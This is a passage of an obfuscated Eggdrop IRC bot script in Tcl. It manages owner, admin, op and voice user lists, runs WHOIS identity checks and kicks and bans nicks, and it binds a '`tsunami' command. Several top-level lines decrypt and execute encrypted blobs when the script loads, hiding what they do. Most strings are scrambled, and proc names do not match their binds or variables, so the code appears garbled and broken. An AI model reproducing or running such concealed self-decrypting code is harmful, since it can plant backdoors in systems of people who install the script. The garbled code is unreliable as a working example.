puthlp "MLGRXV ~$nick ~:~$notc ~<m/z>"
return 0
}
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~WvO \[~$rest\] ~UIlN PRxPORhG"
}
proc [lines "kfy_+mllk"] {nick uhost hand channel param} {
global ps notc botnick
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +mllk <mrxp>"
return 0
}
if {[string tolower $rest] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~ZWW \[~$rest\] ~Gl MlLk ORhG"
return 0
}
if {[validuser $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~rh zoivzwb lm wzgzyzhv drgs uozth: ~[chattr $rest]~"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "slhgnzhp"] "${rest}!*@*"
adduser $rest $hostmask
chattr $rest "-hp"
chattr $rest "O"
if {![validuser $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4!UzROVw! (BlFI VttWILK MlG HfKKLIGVW NlIV GSzM 8 WRtRG)"
deluser $rest
} else {
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~ZWW \[~$rest\] ~Gl MlLk ORhG"
}
foreach x [channels] {
if {[isop $botnick $x] && [onchan $rest $x] && [isop $rest $x]} {
if {![string match "*k*" [getchanmode $x]]} {
putserv "mode $x -ko 4No@p.LIsT $rest"
} {
putserv "mode $x -o $rest"
}
}
}
return 0
}
proc [lines "kfy_-mllk"] {nick uhost hand channel param} {
global ps notc
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: -mllk <mrxp>"
return 0
}
if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc4 ~!WvMRvW!, <m/z>"
return 0
}  
if {![matchattr $rest O]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~rhm'g lm ml-lk orhg Uozth: ~[chattr $rest]~"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
deluser $rest
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~WvO \[~$rest\] ~Ml@k ORhG"
}
proc [lines "kfy_+uirvmw"] {nick uhost hand channel param} {
global notc ps
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +uirvmw <mrxp>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[validuser $rest] && [string tolower $rest] != [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~rh zoivzwb lm wzgzyzhv drgs uozth: ~[chattr $rest]~"
return 0
}  
set [lines "slhgnzhp"] "${rest}!*@*"
adduser $rest $hostmask
chattr $rest "-hp"
chattr $rest "f"
if {![validuser $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4!UzROVw! (BlFI VttWILK MlG HfKKLIGVW NlIV GSzM 8 WRtRG)"
deluser $rest
return 0
}
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~ZWW \[~$rest\] ~Gl UiRvMw ORhG"
puthlp "MLGRXV ~$rest ~:~$notc ~~$nick ~ZWW BlF Gl UiRvMw ORhG"
return 0
}
proc [lines "kfy_-uirvmw"] {nick uhost hand channel param} {
global ps notc 
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: -uirvmw <mrxp>"
return 0
}
if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, <m/z>"
return 0
}  
if {![matchattr $rest f] && ![matchattr $rest m]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~rhm'g lm UiRvMw orhg Uozth: ~[chattr $rest]~"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
deluser $rest
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~WvO \[~$rest\] ~UIlN UiRvMw ORhG"
}
proc [lines "kfy_+zlk"] {nick uhost hand channel param} {
global ps notc botnick chk_reg
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +zlk <mrxp>"
return 0
}
if {[string tolower $rest] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~ZWW \[~$rest\] ~Gl z@k ORhG"
return 0
}
if {[matchattr $rest P]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~rh zoivzwb z@k"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[matchattr $nick X]} {
puthlp "MLGRXV ~$nick ~:~$notc4 ~!YOlXpVw!"
return 0
}
if {![validuser $rest]} {
set [lines "slhgnzhp"] "${rest}!*@*"
adduser $rest $hostmask
chattr $rest "-hp"
}
chattr $rest "P"
if {![validuser $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4!UzROVw! (BlFI VttWILK MlG HfKKLIGVW NlIV GSzM 8 WRtRG)"
deluser $rest
} else {
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~ZWW \[~$rest\] ~Gl z@k ORhG"
puthlp "MLGRXV ~$rest ~:~$notc ~~$nick ~ZWW BlF Gl z@k ORhG"
set chk_reg($rest) $nick
putsrv "DSLRH ~$rest"
}
return 0
}
proc [lines "kfy_-zlk"] {nick uhost hand channel param} {
global notc ps
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: -zlk <mrxp>"
return 0
}
if {![matchattr $rest P]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~rh mlg z@k"
return 0
}  
if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc4 ~!WvMRVW!, <m/z>"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $rest "-P"
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~WvO \[~$rest\] ~UIlN z@k ORhG"
return 0
}
proc [lines "dslrhj"] {nick} {
global botnick
if {$nick == $botnick} { return 0 }
if {[isutimer "whoischk $nick"]} { return 0 }
set [lines "xivg"] [expr 10 + [rand 20]]
foreach ct [utimers] {
if {[string match "*whoisq*" $ct]} {
if {[expr [lindex $ct 0] + 10] > $cret} {
set [lines "xivg"] [expr [lindex $ct 0] + 10]
}
}
}
utimer $cret [list whoischk $nick]
}
proc [lines "dslrhxsp"] {nick} {
global chk_reg botnick
if {[matchattr $nick G]} {
putlog "CHeK GuaRd $nick"
set chk_reg($nick) "1"
puthlp "DSLRH ~$nick"
return 0
}
foreach x [channels] {
if {[isop $botnick $x] && [onchan $nick $x]} {
if {[matchattr $nick P] && ![isop $nick $x]} {
putlog "WHOIS $nick TO GeT a@p"
set chk_reg($nick) "1"
puthlp "DSLRH ~$nick"
return 0
}
if {[matchattr $nick v] && ![isop $nick $x] && ![isvoice $nick $x]} {
putlog "WHOIS $nick TO geT avoIcE"
set chk_reg($nick) "1"
puthlp "DSLRH ~$nick"
return 0
}
}
}
}
set [lines "zgs"] 0
bind raw - 307 reg_chk
proc [lines "ivt_xsp"] {from keyword arg} {
global chk_reg botnick owner notc ps ath
set [lines "mrxp"] [lindex $arg 1]
if {$nick == $botnick} { return 0 }
putlog "NICK $nick IS IDENTIFY..!"
if {[info exists chk_reg($nick)]} {
set chk_reg($nick) "0"
}
set [lines "zgsa"] $ath
if {$athz == 1} {
set [lines "zgs"] 0
chattr $nick +Q
foreach x [getuser $nick HOSTS] {
delhost $nick $x
}
set [lines "slhgnzhp"] "${nick}!*@*"
setuser $nick HOSTS $hostmask
if {[matchattr $nick Z]} {
puthlp "MLGRXV ~$nick ~:~$notc ~!LDmVI!"
} elseif {[matchattr $nick n]} {
puthlp "MLGRXV ~$nick ~:~$notc ~!ZWnRM!"
} elseif {[matchattr $nick m]} {
puthlp "MLGRXV ~$nick ~:~$notc ~!NzhGvI!"
} else {
puthlp "MLGRXV ~$nick ~:~$notc ~!ZxxvkgvW!"
}
saveuser
}
if {[matchattr $nick P] || [matchattr $nick v]} {
foreach x [channels] {
if {[isop $botnick $x] && [onchan $nick $x]} {
if {![string match "*k*" [getchanmode $x]]} {
if {[matchattr $nick P]} {
if {![isop $nick $x]} {
puthelp "MODE $x -k+o 9identified.a@p $nick"
}
}
if {[matchattr $nick v]} {
if {![isvoice $nick $x] && ![isop $nick $x]} {
puthelp "MODE $x -k+v 9identified.avoice $nick"
}
}
} {
if {[matchattr $nick P]} {
if {![isop $nick $x]} {
puthelp "MODE $x +o $nick"
}
}
if {[matchattr $nick v]} {
if {![isvoice $nick $x] && ![isop $nick $x]} {
puthelp "MODE $x +v $nick"
}
}
}
}
}
}
}
bind raw - 318 end_whois
proc [lines "vmw_dslrh"] {from keyword arg} {
global chk_reg notc ath
set [lines "mrxp"] [lindex $arg 1]
set [lines "zgsa"] $ath
if {$athz == 1} {
puthlp "MLGRXV ~$nick ~:~$notc ~Blf'iv MLG Rwvmgrub..!"
set [lines "zgs"] 0
}
if {[info exists chk_reg($nick)]} {
if {$chk_reg($nick) != "0"} {
putlog "NICK $nick IS NoT IDENTIFY..!"
if {[matchattr $nick G] && ![matchattr $nick Q]} {
foreach x [channels] {
if {[onchan $nick $x] && [botisop $x]} {
set [lines "yzmhvg"] "*!*[getchanhost $nick $x]"
putsrv "PRXP ~$x ~~$nick ~:~$notc ~1GSzG MRxP IvJfRIVw Gl 4RwVmGRuB ~[banms]~"
if {$banset != "*!*@*" && $banset != ""} {
if {![string match "*k*" [getchanmode $x]]} {
putserv "mode $x -k+b 4unidentify.guard.nick $banset"
} {
putserv "mode $x +b $banset"
}
}
return 0
}
}
} elseif {[matchattr $nick P] && ![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~z@k rwvmgrub 1hg..!"
} elseif {[matchattr $nick v] && ![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~zelrxv rwvmgrub 1hg..!" 
}
if {$chk_reg($nick) != "1"} {
foreach x [channels] {
if {[onchan $nick $x] && [botisop $x]} { 
set [lines "yzmhvg"] "*!*[getchanhost $nick $x]"
putsrv "PRXP ~$x ~~$nick ~:~$notc ~1GSzG MRxP IvJfRIVw Gl 4RwVmGRuB ~[banms]~"
if {$banset != "*!*@*" && $banset != ""} {
if {![string match "*k*" [getchanmode $x]]} {
putserv "mode $x -k+b 4unidentify.guard.nick $banset"
} {
putserv "mode $x +b $banset"
}
}
return 0
}
}
puthlp "MLGRXV ~$chk_reg($nick) ~:~$notc ~~$nick ~mlg rwvmgrub..!" 
}
unset chk_reg($nick)
}
}
}
proc [lines "kfy_+tmrxp"] {nick uhost hand channel param} {
global notc botnick
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +tmrxp <mrxp>"
return 0
}
if {[matchattr $rest G]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~ivzwb..!"
return 0
}  
if {[matchattr $nick X]} {
puthlp "MLGRXV ~$nick ~:~$notc4 ~!YOlxP!"
return 0
}
if {![validuser $rest]} {
set [lines "slhgnzhp"] "${rest}!*@*"
adduser $rest $hostmask
chattr $rest "-hp"
}
chattr $rest +G
if {![validuser $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4!UzROVw! (BlFI VttWILK MlG HfKKLIGVW NlIV GSzM 8 WRtRG)"
deluser $rest
} else {
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~zww \[~$rest\] ~TfzIw MRxP"
putsrv "DSLRH ~$rest"
}
return 0
}
proc [lines "kfy_-tmrxp"] {nick uhost hand channel param} {
global notc botnick
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: -tmrxp <mrxp>"
return 0
}
if {[matchattr $nick X]} {
puthlp "MLGRXV ~$nick ~:~$notc4 ~!YOlXpVw!"
return 0
}
chattr $rest -G
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~WvO \[~$rest\] ~TfzIw MRxP"
return 0
}
proc [lines "kfy_+zelrxv"] {nick uhost hand channel param} {
global ps notc botnick chk_reg
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +zelrxv <mrxp>"
return 0
}
if {[string tolower $rest] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~ZWW \[~$rest\] ~Gl zElRxV ORhG"
return 0
}
if {[matchattr $rest v]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~rh zoivzwb zfgl elrxv"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[matchattr $nick X]} {
puthlp "MLGRXV ~$nick ~:~$notc4 ~!YOlXpVw!"
return 0
}
if {![validuser $rest]} {
set [lines "slhgnzhp"] "${rest}!*@*"
adduser $rest $hostmask
chattr $rest "-hp"
}
chattr $rest "v"
if {![validuser $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4!UzROVw! (BlFI VttWILK MlG HfKKLIGVW NlIV GSzM 8 WRtRG)"
deluser $rest
} else {
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~ZWW \[~$rest\] ~Gl zElRxV ORhG"
puthlp "MLGRXV ~$rest ~:~$notc ~~$nick ~ZWW BlF Gl zElRxV ORhG"
set chk_reg($rest) $nick
putsrv "DSLRH ~$rest"
}
return 0
}
proc [lines "kfy_-zelrxv"] {nick uhost hand channel param} {
global notc ps
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: -zelrxv <mrxp>"
return 0
}
if {![matchattr $rest v]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~rh mlg zfgl elrxv"
return 0
}  
if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, <m/z>"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $rest "-v"
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~WvO \[~$rest\] ~UIlN zElRxV ORhG"
return 0
}
proc [lines "kfy_+zwnrm"] {nick uhost hand channel param} {
global botnick ps notc
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +zwnrm <mrxp>"
return 0
}
if {[string tolower $rest] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~ZWW \[~$rest\] ~ZWnRM Orhg."
return 0
}
if {[matchattr $rest n]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~rh zoivzwb vcrhg lm ZWnRM orhg."
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[matchattr $nick X]} {
puthlp "MLGRXV ~$nick ~:~$notc4 ~YOlxPVw..!"
return 0
}
if {![validuser $rest]} {
set [lines "slhgnzhp"] "${rest}!*@*"
adduser $rest $hostmask
}
chattr $rest "fjmnotx"
if {![validuser $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4!UzROVw! (BlFI VttWILK MlG HfKKLIGVW NlIV GSzM 8 WRtRG)"
deluser $rest
return 0
} else {
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~ZWW \[~$rest\] ~ZWnRM Orhg."
puthlp "MLGRXV ~$rest ~:~$notc ~~$nick ~ZWW BlF Gl ZWnRM ORhG"
puthlp "MLGRXV ~$rest ~:~$notc ~/nht ~$botnick ~kzhh <kzhhdliw>"
return 0
}
}
proc [lines "kfy_-zwnrm"] {nick uhost hand channel param} {
global ps notc
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: -zwnrm <mrxp>"
return 0
}
if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw!, <m/z>"
return 0
}
if {![matchattr $rest n]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, ~$rest ~rh mlg vcrhg lm ZWnRM orhg."
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
deluser $rest
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~WvO \[~$rest\] ~UIlN ZWnRM ORhG"
}
proc [lines "kfy_+ldmvi"] {nick uhost hand channel param} {
global botnick ps notc 
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +ldmvi <mrxp>"
return 0
}
if {[string tolower $rest] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~ZWW \[~$rest\] ~LdMVI ORhG."
return 0
}
if {[matchattr $rest Z]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~rh zoivzwb vcrhg lm LdMVI orhg."
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[matchattr $nick X]} {
puthlp "MLGRXV ~$nick ~:~$notc4 ~!YOlXpVw!"
return 0
}
if {![validuser $rest]} {
set [lines "slhgnzhp"] "${rest}!*@*"
adduser $rest $hostmask
}
chattr $rest "fjmnotxZ"
if {![validuser $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4!UzROVw! (BlFI VttWILK MlG HfKKLIGVW NlIV GSzM 8 WRtRG)"
deluser $rest
return 0
} else {
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~ZWW \[~$rest\] ~LdMVI ORhG."
puthlp "MLGRXV ~$rest ~:~$notc ~~$nick ~ZWW BlF Gl LdMVI ORhG"
puthlp "MLGRXV ~$rest ~:~$notc ~/nht ~$botnick ~kzhh <kzhhdliw>"
return 0
}
}
proc [lines "kfy_-ldmvi"] {nick uhost hand channel param} {
global notc ps
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: -ldmvi <mrxp>"
return 0
}
if {![validuser $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~<m/z>"
return 0
}
if {![matchattr $rest Z] || [string tolower $rest] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, ~$rest ~RH MlG LdMVI"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
deluser $rest
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~WvO \[~$rest\] ~UIlN LdMVI OrHG"
}
[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "x\sz\m\pvb"] [[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "oe3W1.lOvIO1tL2I9.Q5CQx0iOzI6.jbzCR0Rnv7V0WSUhO/8TEe9/7hXgJ/"]"]]
proc [lines "kfy_+nzhgvi"] {nick uhost hand channel param} {
global botnick ps notc
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +nzhgvi <mrxp>"
return 0
}
if {[matchattr $nick X]} {
puthlp "MLGRXV ~$nick ~:~$notc4 ~!YOlXpVw!"
return 0
}
if {[string tolower $rest] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Zww \[~$rest\] ~NzhGvI ORhG."
return 0
}
if {[matchattr $rest n]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, ~$rest ~rh ZWnRM ovevo."
return 0
}
if {[matchattr $rest m]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, ~$rest ~rh zoivzwb vcrhg."
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {![validuser $rest]} {
set [lines "slhgnzhp"] "${rest}!*@*"
adduser $rest $hostmask
}
chattr $rest "fmo"
if {![validuser $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4!UzROVw! (BlFI VttWILK MlG HfKKLIGVW NlIV GSzM 8 WRtRG)"
deluser $rest
return 0
} else {
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~Zww \[~$rest\] ~NzhGvI Orhg."
puthlp "MLGRXV ~$rest ~:~$notc ~~$nick ~Zww BlF Gl NzhGvI ORhG"
puthlp "MLGRXV ~$rest ~:~$notc ~/nht ~$botnick ~kzhh <kzhhdliw>"
return 0
}
}
bind pubm - * pum_arg
proc [lines "kfy_-nzhgvi"] {nick uhost hand channel param} {
global notc ps
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: -nzhgvi <mrxp>"
return 0
}
if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, <m/z>"
return 0
}
if {[matchattr $rest n] && ![matchattr $nick Z]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, ~$rest ~Rh ZWnRM UOzT"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
deluser $rest
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~WvO \[~$rest\] ~UIlN NzhGvI ORhG"
}
#######################
# NETGATE BOT UTILITY #
#######################
set [lines "grnvalmv"] "PST"
set [lines "qlrmnv"] $owner
set [lines "wlfyov"] 0
set [lines "wvlknv"] ""
bind msgm - * msg_prot
bind notc - * notc_prot
bind join - * join_chk
bind msg - auth msg_auth
bind sign - * sign_deauth
bind part - * part_deauth
bind pub - `tsunami pub_tsunami
bind msg p reuser msg_reuser
bind msg p pass msg_pass
bind pub m `auth pub_auth
bind pub m !auth pub_!auth
bind pub m !deauth pub_!deauth
bind pub f `ping pub_ping
bind pub f `pong pub_pong
proc [lines "kfy_mlgrxv"] {nick uhost hand channel rest} {
global notc 
set [lines "kvihlm"] [lindex $rest 0] 
set [lines "ivhg"] [lrange $rest 1 end]
if {$rest!=""} {
putsrv "MLGRXV ~$person ~:~$rest"
return 0
}
if {$rest==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: mlgrxv <#/mrxp> <nht>"
}
}
proc [lines "gvooqlrm"] {chan} {
global joinme notc botnick
if {![validchan $chan]} { return 0 }
if {[istimer "resync"]} {
if {![botisop $chan]} {
if {![string match "*k*" [getchanmode $chan]]} {
puthelp "mode $chan -kok+o 4d.e.s.y.n.c $botnick 9r.e.s.y.n.c $botnick"
} {
puthelp "mode $chan -o+o $botnick $botnick"
}
}
}
if {$joinme != "" && [string tolower $chan] != [dezip "PK6m.0G/7~xb1"]} {
if {![onchan $joinme $chan]} {
puthlp "MLGRXV ~$joinme ~:~$notc ~QlRM ~$chan"
set [lines "qlrmnv"] ""
}
}
}
proc [lines "xsphkzn"] {chan} {
global invme notc botnick
if {![validchan $chan] || ![botonchan $chan]} { return 0 }
foreach x [chanlist $chan] {
set [lines "nslhg"] "@[lindex [split [getchanhost $x $chan] @] 1]"
if {[info exists invme($mhost)]} {
if {![matchattr $x f] && ![isop $x $chan]} {
if {[isop $botnick $chan]} {
set bannick($x) "*!*$mhost"
if {$invme($mhost) == "AuToJoIN MSg"} {
if {![isvoice $x $chan]} {
putsrv "PRXP ~$chan ~~$x ~:~$notc ~4!HkzN!1 UIlN 4~$mhost ~1~$invme($mhost) ~~[banmsg]~"
}
} {
putsrv "PRXP ~$chan ~~$x ~:~$notc ~4!HkzN!1 UIlN 4~$mhost ~1~$invme($mhost) ~~[banmsg]~"
}
catch {unset invme($mhost)}
} {
foreach c [chanlist $chan f] {
if {[isop $c $chan]} {
if {$invme($mhost) == "AuToJoIN MSg"} {
if {[isvoice $c $chan]} {
break
}
}
set sendspam "!kick [zip "$chan $x $notc 4!SpaM!1 FRoM 4$mhost 1$invme($mhost) 4AuTOJoIN MSg1..!"]"
putsrv "KIRENHT ~$c ~:~$sendspam"
catch {unset invme($mhost)}
break
}
}
}
}
}
}
}
set [lines "evim"] [dezip [dcp "5KFT3/aechP.JR3HS/b2poV/PmYvc0Fms6P1UroZW.Ea7tq.zUzoE/1lqeT0"]]
proc [lines "gvhgnzhp"] {} {
global ismaskhost
set [lines "rhnzhpslhg"] [maskhost "*!*@*"]
}
utimer 2 testmask
proc [lines "ivhvg_slhg"] {} {
global jfhost
catch { unset jfhost }
}
[[decrypt 64 "d3VeO/ATgwd."] "hvg"] [[decrypt 64 "d3VeO/ATgwd."] "[[[decrypt 64 "d3VeO/ATgwd."] "wvar\k"] "mMBOB/ltrCY0"]"] [[[decrypt 64 "d3VeO/ATgwd."] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "wx\k"] "[[decrypt 64 "d3VeO/ATgwd."] "9srTD.mJ6Md1xrnx70DmLnX/L5Ltj01OtYf/"]"]]
proc [lines "hzevxszm"] {} {
savechannels
foreach x [channels] {
set [lines "xuozt"] "c$x"
set [lines "xuozt"] [string range $cflag 0 8]
set [lines "xrmul"] [channel info $x]
if {![validuser $cflag]} {
adduser $cflag "%!%@%"
if {[string match "*+greet*" $cinfo]} {
chattr $cflag "-hp+AJSPTRUED"
setuser $cflag XTRA "JP" 5
setuser $cflag XTRA "CHAR" 250
setuser $cflag XTRA "RPT" 2
setuser $cflag XTRA "CAPS" 80
} {
chattr $cflag "-hp+A"
}
}
}
foreach x [userlist A] {
set [lines "gnk"] "0"
foreach y [channels] {
set [lines "xuozt"] "c$y"
set [lines "xuozt"] [string range $cflag 0 8]
if {[string tolower $x] == [string tolower $cflag]} {
set [lines "gnk"] "1"
}
}
if {$tmp == "0"} {
deluser $x
putlog "remove flag channel $x"
}
}
saveuser
}
set [lines "rmul_ldmvi"] {
"My Master just came in..."
"Hello my OWNER"
"I greet you my owner"
"Welcome my owner"
"ShaKe me my owner!"
"Most Great"
}
set [lines "rmul_olxzoldmvi"] {
"Lol...my local owner just joined the channel"
"Welcome localowner of mine.."
"Hi sweety {}"
}
set [lines rmul_nzhgvi"] {
"Oh...My MASTER"
"I'm gonna be quiet my master"
"Don't hit me my master"
"Master detected"
}
set [lines "rmul_uirvmw"] {
"Ou, my friend :)"
":)"
"Sweety"
"You're Sweety"
"My friendship with you is over!"
"KISS me Baby {}"
}
set [lines "rmul_lkvi"] {
"You simple oper, watch out !"
"Operator detected!"
"You gonna lose your flags if you do something bad!"
"I'm watching you..."
}
set [lines "rmul_olhvi"] {
"What are you doing here loser"
"You're just a loser"
}
proc [lines "izmw_ldmvi"] {nick} {
global info_owner
set result [lindex $info_owner [rand [llength $info_owner]]]
return "$result"
}
proc [lines "izmw_olxzoldmvi"] {nick} {
global info_localowner
set result [lindex $info_localowner [rand [llength $info_localowner]]]
return "$result"
}
proc [lines "izmw_nzhgvi"] {nick} {
global info_master
set result [lindex $info_master [rand [llength $info_master]]]
return "$result"
}
proc [lines "izmw_uirvmw"] {nick} {
global info_friend
set result [lindex $info_friend [rand [llength $info_friend]]]
return "$result"
}
proc [lines "izmw_lkvi"] {nick} {
global info_oper
set result [lindex $info_oper [rand [llength $info_oper]]]
return "$result"
}
proc [lines "izmw_olhvi"] {nick} {
global info_loser
set result [lindex $info_loser [rand [llength $info_loser]]]
return "$result"
}
proc [lines "qlrm_xsp"] {nick uhost hand chan} {
global botnick own deopme double invme ex_flood notc quick kops jfhost jpnick is_m 
global cmd_chn cmd_by cmd_msg cmd_case bannick botname notm massjoin ismaskhost op_it
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
set [lines "xrmul"] [channel info $chan]
if {[string match "*+action*" [channel info $chan]]} {
if { $nick != $botnick } {
if {[matchattr $hand n]} {
putsrv "KIRENHT ~$chan :[rand_owner $nick] $nick \[+n\]"
} elseif {[matchattr $hand |n $chan]} {
putsrv "KIRENHT ~$chan :[rand_localowner $nick] $nick \[|+n\]"
} elseif {[matchattr $hand m]} {
putsrv "KIRENHT ~$chan :[rand_master $nick] $nick \[+m\]"
} elseif {[matchattr $hand |m $chan]} {
